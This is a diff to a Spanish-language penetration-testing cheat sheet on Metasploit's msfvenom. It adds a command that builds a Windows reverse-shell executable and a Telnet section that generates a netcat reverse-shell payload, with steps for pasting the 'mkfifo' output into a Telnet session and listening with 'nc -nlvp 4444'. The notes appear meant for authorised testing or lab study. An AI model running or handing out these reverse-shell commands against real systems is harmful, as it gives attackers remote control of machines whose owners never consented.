@@ -20,6 +20,7 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 	# a = Arquitectura
 
 ❯ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.0.0.1 LPORT=443 -f exe > shell.exe
+❯ msfvenom -p windows/x64/shell/reverse_tcp LHOST=172.0.0.1 LPORT=443 -f exe > shell.exe
 ```
 ### Linux Meterpreter
 
@@ -47,6 +48,17 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 	❯ set LHOST 172.0.0.1
 	❯ set LPORT 4444
 	❯ run 
+```
+
+## Telnet 
+
+```bash 
+❯ msfvenom -p cmd/unix/reverse_netcat LHOST=172.0.0.1 LPORT=4444 R 
+
+Nota: 
+	1. Copiar todo el output que inicia con 'mkfifo' y pegarlo en la sesión de Telnet 
+	2. Estar en esucha de la siguiente manera 'nc -nlvp 4444'
+	3. La 'R' es opcional 
 ```
 
 ## IIS - WebDAV
